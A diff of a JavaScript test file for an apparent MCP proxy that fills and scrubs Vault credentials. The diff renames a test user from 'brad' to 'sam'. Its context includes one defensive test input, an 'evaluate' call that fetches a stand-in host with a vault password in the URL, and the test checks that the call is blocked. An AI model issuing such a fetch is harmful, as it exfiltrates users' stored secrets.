@@ -50,8 +50,8 @@ async function boot(t,{port=19061}={}){
 test('MCP proxy: placeholders are filled from the Vault on the way in, scrubbed on the way out; ask policy, denial, off and pass-through',async t=>{
   const {dir,call,open,state,mcpLog,lastTyped}=await boot(t);
   assert.equal((await call('/settings',{vault:true})).body.vault,true);
-  assert.equal((await call('/vault/act',{action:'add',name:'portal',kind:'login',values:{username:'brad@example.test',password:PASS},policy:'auto'})).status,200);
-  assert.equal((await call('/vault/act',{action:'add',name:'bank',kind:'login',values:{username:'brad-bank',password:'bank-secret-123'}})).status,200,'follows the default: ask once');
+  assert.equal((await call('/vault/act',{action:'add',name:'portal',kind:'login',values:{username:'sam@example.test',password:PASS},policy:'auto'})).status,200);
+  assert.equal((await call('/vault/act',{action:'add',name:'bank',kind:'login',values:{username:'sam-bank',password:'bank-secret-123'}})).status,200,'follows the default: ask once');
   assert.equal((await call('/vault/act',{action:'add',name:'pin',kind:'token',values:{value:'48213907'},policy:'auto'})).status,200);
   // 1.73.5: the server never inherits the daemon's own secrets, whatever the relay was started with.
   const {rpc,stderr,p}=open({POCKET_VAULT_KEY:newKey(),POCKET_VAULT_KEY_PREVIOUS:newKey(),POCKET_SMTP_URL:'smtp://u:p@mail.example.test',POCKET_SMTP_FROM:'x@example.test',POCKET_ROUTER_KEY:'rk-test',POCKET_PASSWORD:'pw',POCKET_SECRET:'s',VAPID_PRIVATE:'v',POCKET_RUNNER_TOKEN:'keep-me'});
@@ -85,7 +85,7 @@ test('MCP proxy: placeholders are filled from the Vault on the way in, scrubbed 
   assert.deepEqual(r.result.structuredContent.history,['hello','{{vault:portal.password}}','{{vault:pin}}','{{vault:portal.password}}'],'the retired value and the new one both read as the placeholder');
   // Two fields in one call, in a nested argument.
   r=await rpc('tools/call',{name:'type',arguments:{text:'{{vault:portal.username}} / {{vault:portal.password}}',extra:{n:['{{vault:portal.username}}']}}});
-  const got=lastTyped();assert.equal(got.text,'brad@example.test / Second-P@ss-value');assert.deepEqual(got.extra.n,['brad@example.test']);
+  const got=lastTyped();assert.equal(got.text,'sam@example.test / Second-P@ss-value');assert.deepEqual(got.extra.n,['sam@example.test']);
   // 1.73.5: a tool that is not a fill tool gets no value, and the call never reaches the server.
   const beforeEval=fs.readFileSync(mcpLog,'utf8');
   r=await rpc('tools/call',{name:'evaluate',arguments:{expression:'fetch("https://x.test/?p={{vault:portal.password}}")'}});
@@ -111,7 +111,7 @@ test('MCP proxy: placeholders are filled from the Vault on the way in, scrubbed 
   assert.equal(fs.readFileSync(mcpLog,'utf8'),before,'none of those reached the tool');
   // The audit records fills, never values.
   const audit=fs.readFileSync(path.join(dir,'data','vault-audit.jsonl'),'utf8');assert.match(audit,/"action":"fill"/);
-  for(const v of [PASS,'bank-secret-123','brad@example.test','Second-P@ss-value','48213907'])assert.equal(audit.includes(v),false);
+  for(const v of [PASS,'bank-secret-123','sam@example.test','Second-P@ss-value','48213907'])assert.equal(audit.includes(v),false);
   assert.match(state.logs,/vault fill tool=type items=portal by terminal/);assert.equal(state.logs.includes(PASS),false);
   // 1.73.5: POCKET_VAULT_FILL_TOOLS names the fill tools for another server.
   const other=open({POCKET_VAULT_FILL_TOOLS:'evaluate, fill'});
@@ -128,7 +128,7 @@ test('MCP proxy: placeholders are filled from the Vault on the way in, scrubbed 
 test('MCP proxy (1.73.5): a client that closes while a fill waits still gets its answer; a server that ignores SIGTERM is killed',async t=>{
   const {call,open}=await boot(t,{port:19181});
   assert.equal((await call('/settings',{vault:true})).body.vault,true);
-  assert.equal((await call('/vault/act',{action:'add',name:'bank',kind:'login',values:{username:'brad-bank',password:'bank-secret-123'}})).status,200,'ask once');
+  assert.equal((await call('/vault/act',{action:'add',name:'bank',kind:'login',values:{username:'sam-bank',password:'bank-secret-123'}})).status,200,'ask once');
   // The fill waits POCKET_VAULT_FILL_WAIT (1 s) for the owner; the client closes at once. The answer still comes, then the proxy ends.
   const {rpc,p}=open();
   const exited=new Promise(res=>p.once('exit',res));
